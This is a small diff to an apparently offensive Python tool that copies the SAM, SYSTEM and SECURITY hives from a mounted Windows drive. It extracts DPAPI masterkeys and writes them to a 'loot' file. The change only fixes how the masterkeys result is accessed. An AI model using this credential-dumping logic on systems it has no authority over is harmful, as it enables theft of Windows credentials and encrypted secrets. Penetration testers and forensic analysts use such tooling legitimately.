@@ -30,10 +30,10 @@ def __main__(drive_name,drive_format):
 			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
 			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SECURITY","tofu_tmp/HASHDUMP_SECURITY")
 			masterkeys = tofu_lib.dpapi.get_masterkeys("tofu_tmp/windows_filesystem", "tofu_tmp/HASHDUMP_SAM", "tofu_tmp/HASHDUMP_SYSTEM", "tofu_tmp/HASHDUMP_SECURITY")
-			if masterkeys:
+			if masterkeys.masterkeys:
 				print("[+] We have masterkeys!")
 				keylogfile = open("tofu_loot/masterkeys.txt",'a')
-				for masterkey in masterkeys:
+				for masterkey in masterkeys.masterkeys:
 					keylogfile.write(f"{masterkey}\n")
 					print(f"-- MASTERKEY / {masterkey}")
 					
